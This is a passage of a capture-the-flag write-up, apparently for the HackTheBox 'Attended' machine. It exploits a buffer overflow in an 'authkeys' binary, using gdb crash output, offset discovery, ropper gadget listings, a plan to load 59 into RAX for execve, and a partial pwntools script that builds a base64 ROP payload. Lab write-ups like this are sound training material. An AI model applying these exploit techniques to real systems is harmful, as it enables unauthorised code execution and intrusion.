gef➤  r 1 2 3 YWFhYWFhYWFiYWFhYWFhYWNhYWFhYWFhZGFhYWFhYWFlYWFhYWFhYWZhYWFhYWFhZ2FhYWFhYWFoYWFhYWFhYWlhYWFhYWFhamFhYWFhYWFrYWFhYWFhYWxhYWFhYWFhbWFhYWFhYWFuYWFhYWFhYW9hYWFhYWFhcGFhYWFhYWFxYWFhYWFhYXJhYWFhYWFhc2FhYWFhYWF0YWFhYWFhYXVhYWFhYWFhdmFhYWFhYWF3YWFhYWFhYXhhYWFhYWFheWFhYWFhYWF6YWFhYWFhYmJhYWFhYWFiY2FhYWFhYWJkYWFhYWFhYmVhYWFhYWFiZmFhYWFhYWJnYWFhYWFhYmhhYWFhYWFiaWFhYWFhYWJqYWFhYWFhYmthYWFhYWFibGFhYWFhYWJtYWFhYWFhYm5hYWFhYWFib2FhYWFhYWJwYWFhYWFhYnFhYWFhYWFicmFhYWFhYWJzYWFhYWFhYnRhYWFhYWFidWFhYWFhYWJ2YWFhYWFhYndhYWFhYWFieGFhYWFhYWJ5YWFhYWFhYnphYWFhYWFjYmFhYWFhYWNjYWFhYWFhY2RhYWFhYWFjZWFhYWFhYWNmYWFhYWFhY2dhYWFhYWFjaGFhYWFhYWNpYWFhYWFhY2phYWFhYWFja2FhYWFhYWNsYWFhYWFhY21hYWFhYWFjbmFhYWFhYWNvYWFhYWFhY3BhYWFhYWFjcWFhYWFhYWNyYWFhYWFhY3NhYWFhYWFjdGFhYWFhYWN1YWFhYWFhY3ZhYWFhYWFjd2FhYWFhYWN4YWFhYWFhY3lhYWFhYWFjemFhYWFhYWRiYWFhYWFhZGNhYWFhYWFkZGFhYWFhYWRlYWFhYWFhZGZhYWFhYWFkZ2FhYWFhYWRoYWFhYWFhZGlhYWFhYWFkamFhYWFhYWRrYWFhYWFhZGxhYWFhYWFkbWFhYWFhYWRuYWFhYWFhZG9hYWFhYWFkcGFhYWFhYWRxYWFhYWFhZHJhYWFhYWFkc2FhYWFhYWR0YWFhYWFhZHVhYWFhYWFkdmFhYWFhYWR3YWFhYWFhZHhhYWFhYWFkeWFhYWFhYWR6YWFhYWFhZWJhYWFhYWFlY2FhYWFhYWVkYWFhYWFhZWVhYWFhYWFlZmFhYWFhYWVnYWFhYWFhZWhhYWFhYWFlaWFhYWFhYWVqYWFhYWFhZWthYWFhYWFlbGFhYWFhYWVtYWFhYWFhZW5hYWFhYWFlb2FhYWFhYWVwYWFhYWFhZXFhYWFhYWFlcmFhYWFhYWVzYWFhYWFhZXRhYWFhYWFldWFhYWFhYWV2YWFhYWFhZXdhYWFhYWFleGFhYWFhYWV5YWFhYWFhZXphYWFhYWFmYmFhYWFhYWZjYWFhYWFhZg==
Starting program: /root/attended/authkeys 1 2 3 YWFhYWFhYWFiYWFhYWFhYWNhYWFhYWFhZGFhYWFhYWFlYWFhYWFhYWZhYWFhYWFhZ2FhYWFhYWFoYWFhYWFhYWlhYWFhYWFhamFhYWFhYWFrYWFhYWFhYWxhYWFhYWFhbWFhYWFhYWFuYWFhYWFhYW9hYWFhYWFhcGFhYWFhYWFxYWFhYWFhYXJhYWFhYWFhc2FhYWFhYWF0YWFhYWFhYXVhYWFhYWFhdmFhYWFhYWF3YWFhYWFhYXhhYWFhYWFheWFhYWFhYWF6YWFhYWFhYmJhYWFhYWFiY2FhYWFhYWJkYWFhYWFhYmVhYWFhYWFiZmFhYWFhYWJnYWFhYWFhYmhhYWFhYWFiaWFhYWFhYWJqYWFhYWFhYmthYWFhYWFibGFhYWFhYWJtYWFhYWFhYm5hYWFhYWFib2FhYWFhYWJwYWFhYWFhYnFhYWFhYWFicmFhYWFhYWJzYWFhYWFhYnRhYWFhYWFidWFhYWFhYWJ2YWFhYWFhYndhYWFhYWFieGFhYWFhYWJ5YWFhYWFhYnphYWFhYWFjYmFhYWFhYWNjYWFhYWFhY2RhYWFhYWFjZWFhYWFhYWNmYWFhYWFhY2dhYWFhYWFjaGFhYWFhYWNpYWFhYWFhY2phYWFhYWFja2FhYWFhYWNsYWFhYWFhY21hYWFhYWFjbmFhYWFhYWNvYWFhYWFhY3BhYWFhYWFjcWFhYWFhYWNyYWFhYWFhY3NhYWFhYWFjdGFhYWFhYWN1YWFhYWFhY3ZhYWFhYWFjd2FhYWFhYWN4YWFhYWFhY3lhYWFhYWFjemFhYWFhYWRiYWFhYWFhZGNhYWFhYWFkZGFhYWFhYWRlYWFhYWFhZGZhYWFhYWFkZ2FhYWFhYWRoYWFhYWFhZGlhYWFhYWFkamFhYWFhYWRrYWFhYWFhZGxhYWFhYWFkbWFhYWFhYWRuYWFhYWFhZG9hYWFhYWFkcGFhYWFhYWRxYWFhYWFhZHJhYWFhYWFkc2FhYWFhYWR0YWFhYWFhZHVhYWFhYWFkdmFhYWFhYWR3YWFhYWFhZHhhYWFhYWFkeWFhYWFhYWR6YWFhYWFhZWJhYWFhYWFlY2FhYWFhYWVkYWFhYWFhZWVhYWFhYWFlZmFhYWFhYWVnYWFhYWFhZWhhYWFhYWFlaWFhYWFhYWVqYWFhYWFhZWthYWFhYWFlbGFhYWFhYWVtYWFhYWFhZW5hYWFhYWFlb2FhYWFhYWVwYWFhYWFhZXFhYWFhYWFlcmFhYWFhYWVzYWFhYWFhZXRhYWFhYWFldWFhYWFhYWV2YWFhYWFhZXdhYWFhYWFleGFhYWFhYWV5YWFhYWFhZXphYWFhYWFmYmFhYWFhYWZjYWFhYWFhZg==
Evaluating key...

Program received signal SIGSEGV, Segmentation fault.
clear: unknown option -- x
usage: clear [-T term]
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[*] Failed to read /proc/<PID>/maps, using GDB sections info: [Errno 2] No such file or directory: '/proc/6091/maps'
$rax   : 0x0               
$rbx   : 0xffffffffffffffff
$rcx   : 0x0               
$rdx   : 0x6461616161616176 ("vaaaaaad"?)
$rsp   : 0x7f7ffffe9cd8    
$rbp   : 0x7f7ffffe9ce0    
$rsi   : 0x0               
$rdi   : 0x0               
$rip   : 0x000000000040036b  →   ret 
$r8    : 0x7f7ffffea3a6    
$r9    : 0x7f7ffffe9dd0    
$r10   : 0x7f7ffffe99d0    
$r11   : 0x3616161616161660
$r12   : 0x7f7ffffe9e4e    
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x002b $ss: 0x0023 $ds: 0x0023 $es: 0x0023 $fs: 0x0023 $gs: 0x0023 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400364                  xor    rsi, rsi
     0x400367                  mov    rdi, rsi
     0x40036a                  pop    rdx
 →   0x40036b                  ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x40036b in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40036b → ret 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x000000000040036b in ?? ()
gef➤  
Display all 200 possibilities? (y or n)
gef➤  pattern search vaaaaaad
[+] Searching 'vaaaaaad'
[+] Found at offset 768 (big-endian search) 
gef➤  x/s 0x7f7ffffe9cd8
0x7f7ffffe9cd8:	"waaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf"
gef➤  pattern search waaaaaadxaaaaaadya
[+] Searching 'waaaaaadxaaaaaadya'
[+] Found at offset 776 (big-endian search) 
====================================================================================================================================

We can now create our own personal string to have 776 'A''s and 'B's with 'C's when running the program
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $echo -n 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf' | base64 -w 0
YWFhYWFhYWFiYWFhYWFhYWNhYWFhYWFhZGFhYWFhYWFlYWFhYWFhYWZhYWFhYWFhZ2FhYWFhYWFoYWFhYWFhYWlhYWFhYWFhamFhYWFhYWFrYWFhYWFhYWxhYWFhYWFhbWFhYWFhYWFuYWFhYWFhYW9hYWFhYWFhcGFhYWFhYWFxYWFhYWFhYXJhYWFhYWFhc2FhYWFhYWF0YWFhYWFhYXVhYWFhYWFhdmFhYWFhYWF3YWFhYWFhYXhhYWFhYWFheWFhYWFhYWF6YWFhYWFhYmJhYWFhYWFiY2FhYWFhYWJkYWFhYWFhYmVhYWFhYWFiZmFhYWFhYWJnYWFhYWFhYmhhYWFhYWFiaWFhYWFhYWJqYWFhYWFhYmthYWFhYWFibGFhYWFhYWJtYWFhYWFhYm5hYWFhYWFib2FhYWFhYWJwYWFhYWFhYnFhYWFhYWFicmFhYWFhYWJzYWFhYWFhYnRhYWFhYWFidWFhYWFhYWJ2YWFhYWFhYndhYWFhYWFieGFhYWFhYWJ5YWFhYWFhYnphYWFhYWFjYmFhYWFhYWNjYWFhYWFhY2RhYWFhYWFjZWFhYWFhYWNmYWFhYWFhY2dhYWFhYWFjaGFhYWFhYWNpYWFhYWFhY2phYWFhYWFja2FhYWFhYWNsYWFhYWFhY21hYWFhYWFjbmFhYWFhYWNvYWFhYWFhY3BhYWFhYWFjcWFhYWFhYWNyYWFhYWFhY3NhYWFhYWFjdGFhYWFhYWN1YWFhYWFhY3ZhYWFhYWFjd2FhYWFhYWN4YWFhYWFhY3lhYWFhYWFjemFhYWFhYWRiYWFhYWFhZGNhYWFhYWFkZGFhYWFhYWRlYWFhYWFhZGZhYWFhYWFkZ2FhYWFhYWRoYWFhYWFhZGlhYWFhYWFkamFhYWFhYWRrYWFhYWFhZGxhYWFhYWFkbWFhYWFhYWRuYWFhYWFhZG9hYWFhYWFkcGFhYWFhYWRxYWFhYWFhZHJhYWFhYWFkc2FhYWFhYWR0YWFhYWFhZHVhYWFhYWFkdmFhYWFhYWR3YWFhYWFhZHhhYWFhYWFkeWFhYWFhYWR6YWFhYWFhZWJhYWFhYWFlY2FhYWFhYWVkYWFhYWFhZWVhYWFhYWFlZmFhYWFhYWVnYWFhYWFhZWhhYWFhYWFlaWFhYWFhYWVqYWFhYWFhZWthYWFhYWFlbGFhYWFhYWVtYWFhYWFhZW5hYWFhYWFlb2FhYWFhYWVwYWFhYWFhZXFhYWFhYWFlcmFhYWFhYWVzYWFhYWFhZXRhYWFhYWFldWFhYWFhYWV2YWFhYWFhZXdhYWFhYWFleGFhYWFhYWV5YWFhYWFhZXphYWFhYWFmYmFhYWFhYWZjYWFhYWFhZg==
====================================================================================================================================


Commands and Output:
====================================================================================================================================
gef➤  rkJCQkJCQkNDQ0NDQ0NDCg==
Starting program: /root/attended/authkeyskJCQkJCQkNDQ0NDQ0NDCg==
Evaluating key...

Program received signal SIGSEGV, Segmentation fault.
clear: unknown option -- x
usage: clear [-T term]
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[*] Failed to read /proc/<PID>/maps, using GDB sections info: [Errno 2] No such file or directory: '/proc/77146/maps'
$rax   : 0x0               
$rbx   : 0xffffffffffffffff
$rcx   : 0x0               
$rdx   : 0x4141414141414141 ("AAAAAAAA"?)
$rsp   : 0x7f7ffffd4f28    
$rbp   : 0x7f7ffffd4f30    
$rsi   : 0x0               
$rdi   : 0x0               
$rip   : 0x000000000040036b  →   ret 
$r8    : 0x7f7ffffd54c2    
$r9    : 0x7f7ffffd4f39    
$r10   : 0x7f7ffffd4c20    
$r11   : 0x34343434343430a0
$r12   : 0x7f7ffffd509e    
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x002b $ss: 0x0023 $ds: 0x0023 $es: 0x0023 $fs: 0x0023 $gs: 0x0023 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400364                  xor    rsi, rsi
     0x400367                  mov    rdi, rsi
     0x40036a                  pop    rdx
 →   0x40036b                  ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x40036b in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40036b → ret 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x000000000040036b in ?? ()
gef➤  x/s 0x7f7ffffd4f28
0x7f7ffffd4f28:	"BBBBBBBBCCCCCCCC\nP\375\377\177\177"
====================================================================================================================================

Once we have discovered the buffer overflow, the next thing to do is prove that we can jump somewhere in the program, using IDA 
we can try and find that
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $python2 -c 'print("A"*776 + "\xa9\x03\x40\x00\x00\x00\x00")' | base64 -w 0
pA0AAAAAACg==┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $python2 -c 'print("A"*776 + "\xa9\x03\x40\x00\x00\x00\x00")' | base64 -w 0 | c
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $python2 -c 'print("A"*776 + "\xa9\x03\x40\x00\x00\x00\x00\x00")' | base64 -w 0 | c
..
..
..

gef➤  rpA0AAAAAAAAo=
Starting program: /root/attended/authkeyspA0AAAAAAAAo=
Evaluating key...
Too bad, Wrong number of arguments!
[Inferior 1 (process 98422) exited normally]
====================================================================================================================================

As seen we have exited gracefully. Now we will have to look at how to do the ROP chain for this binary exploit.
Will use ROPPER, but first we want to take a look and google "syscall table chromium"
https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md

We can also google openbsd syscall.h

We will now use ROPPER to find gadgets.
Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $ropper --file authkeys --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $ropper --file authkeys --search "pop rax"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax

====================================================================================================================================

As you can see there is none. We now try rdx.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $ropper --file authkeys --search "pop rdx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx

[INFO] File: authkeys
0x000000000040036a: pop rdx; ret;
====================================================================================================================================

We will now have to try different gadget chains to get data in there. Gadgets are not easy to find.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $ropper --file authkeys | grep ax
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004003c1: add al, ch; or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x0000000000400360: add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c0: add byte ptr [rax], al; call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040035f: add byte ptr [rax], al; xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x000000000040035e: add eax, dword ptr [rax]; add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x0000000000400399: dec dword ptr [rax + 0x31]; leave; ret; 
0x0000000000400394: mov eax, 0xffffffff; xor rcx, rcx; ret; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; ret; 
0x0000000000400393: mov rax, -1; xor rcx, rcx; ret; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x0000000000400363: ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400366: test byte ptr [rax - 0x77], 0xf7; pop rdx; ret; 
0x0000000000400362: xor eax, eax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x0000000000400361: xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
====================================================================================================================================

EAX is part of RAX, so may want to look at the EAX gadgets
Commands and Output:
====================================================================================================================================
0x0000000000400370: shr eax, 1; ret;
====================================================================================================================================

Another thing to look at is the assembly registers and how certain registers are part of other larger registers example can be found
in the following web page:
https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm

A thing to look at is that "AL" is part of EAX which we should consider also as a potential gadget.
Commands and Output:
====================================================================================================================================
0x000000000040036d: not al; adc cl, 0xe8; ret;
====================================================================================================================================

One of the things we want to be able to do is make sure that the value of RAX is set to "0x3b" as that is what is needed for execve
system call to work. We want 59 in decimal based on the chromium syscalls

RAX 00000000
SHR 00000000
NOT 11111111
TGT 00111011 # Execve (59)

We will use the shifts and NOTS to build the 59 string in the register.
Commands and Output:
====================================================================================================================================
RAX 00000000
NOT 11111111
SHR 01111111
SHR 00111111
NOT 11000000
SHR 01100000
NOT 10011111
SHR 01001111
SHR 00100111
SHR 00010011
NOT 11101100
SHR 01110110
SHR 00111011
TGT 00111011 # Execve (59)

====================================================================================================================================

Now we wil be able to use that gadget to make the value of RAX syscall of 59. We need to find gadgets for RDI but as you can see by
theoutput of ropper below we don't have anything that properly references rdi. So we will have to get creative.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $ropper --file authkeys 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040037d: adc byte ptr [rdx], al; mov ebx, 0xf02d0ff3; ret; 
0x000000000040036f: adc cl, 0xe8; ret; 
0x00000000004003c1: add al, ch; or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x000000000040037e: add bh, byte ptr [rbx - 0xfd2f00d]; ret; 
0x0000000000400360: add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c6: add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; 
0x00000000004003c4: add byte ptr [rax], al; add byte ptr [rax + 1], bh; xor rdi, rdi; syscall; ret; 
0x00000000004003c0: add byte ptr [rax], al; call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c5: add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040035f: add byte ptr [rax], al; xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003ca: add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; 
0x00000000004003c8: add dword ptr [rax], eax; add byte ptr [rax], al; xor rdi, rdi; syscall; ret; 
0x000000000040035e: add eax, dword ptr [rax]; add byte ptr [rax + 0x31], cl; ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c2: call 0x3cf; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x0000000000400381: cvtps2pi mm6, xmm0; ret; 
0x0000000000400380: cvtss2si esi, xmm0; ret; 
0x0000000000400399: dec dword ptr [rax + 0x31]; leave; ret; 
0x0000000000400377: fcomp st(0), st(0); ret; 
0x0000000000400394: mov eax, 0xffffffff; xor rcx, rcx; ret; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c7: mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040037f: mov ebx, 0xf02d0ff3; ret; 
0x000000000040037a: mov ecx, 0x2100ff3; mov ebx, 0xf02d0ff3; ret; 
0x0000000000400368: mov edi, esi; pop rdx; ret; 
0x0000000000400393: mov rax, -1; xor rcx, rcx; ret; 
0x0000000000400367: mov rdi, rsi; pop rdx; ret; 
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040037c: movups xmm0, xmmword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
0x000000000040036d: not al; adc cl, 0xe8; ret; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; 
0x00000000004003c3: or byte ptr [rax], al; add byte ptr [rax], al; mov eax, 1; xor rdi, rdi; syscall; ret; 
0x000000000040036a: pop rdx; ret; 
0x0000000000400363: ror byte ptr [rax + 0x31], 0xf6; mov rdi, rsi; pop rdx; ret; 
0x0000000000400376: sbb dh, 0xd0; ret; 
0x0000000000400370: shr eax, 1; ret; 
0x0000000000400366: test byte ptr [rax - 0x77], 0xf7; pop rdx; ret; 
0x0000000000400373: xor cl, 0xe0; sbb dh, 0xd0; ret; 
0x000000000040036c: xor dh, 0xd0; adc cl, 0xe8; ret; 
0x0000000000400362: xor eax, eax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039b: xor ecx, ecx; ret; 
0x00000000004003cd: xor edi, edi; syscall; 
0x00000000004003cd: xor edi, edi; syscall; ret; 
0x0000000000400365: xor esi, esi; mov rdi, rsi; pop rdx; ret; 
0x0000000000400361: xor rax, rax; xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039a: xor rcx, rcx; ret; 
0x00000000004003cc: xor rdi, rdi; syscall; 
0x00000000004003cc: xor rdi, rdi; syscall; ret; 
0x0000000000400364: xor rsi, rsi; mov rdi, rsi; pop rdx; ret; 
0x000000000040039c: leave; ret; 
0x000000000040028a: ret; 
0x00000000004003cf: syscall; 
0x00000000004003cf: syscall; ret; 

58 gadgets found
====================================================================================================================================

We will need quite a few assembly instructions. 
Commands and Output:
====================================================================================================================================
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
====================================================================================================================================

What the above does is move a floating point number, it will rdx into xmm0. We don't want rdx but rdi however if we look at rdx there
is a pop rdx gadget. Inorder to be able to pop rdi we need the following instruction.
Commands and Output:
====================================================================================================================================
* 0x000000000040036a: pop rdx; ret;
* -- FLOAT PTR to RDI
* 0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret; 
* 0x0000000000400380: cvtss2si esi, xmm0; ret; 
* 0x0000000000400367: mov rdi, rsi; pop rdx; ret;
====================================================================================================================================

We create our POC python code and test it by running the output generated into the debugger.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended]
└──╼ $cat buf.py 
from base64 import b64encode
from pwn import *
import pyperclip

# GADGETS
shr_eax = p64(0x400370)
not_al = p64(0x40036d)

buf = b''
buf += b'A' * 776 
buf += not_al
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax
buf += shr_eax
buf += not_al
buf += shr_eax
buf += shr_eax

b64str = b64encode(buf).decode()
print(b64str)
pyperclip.copy(b64str)

..
..
..

gef➤  r 1 2 3 QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFtA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAAA=
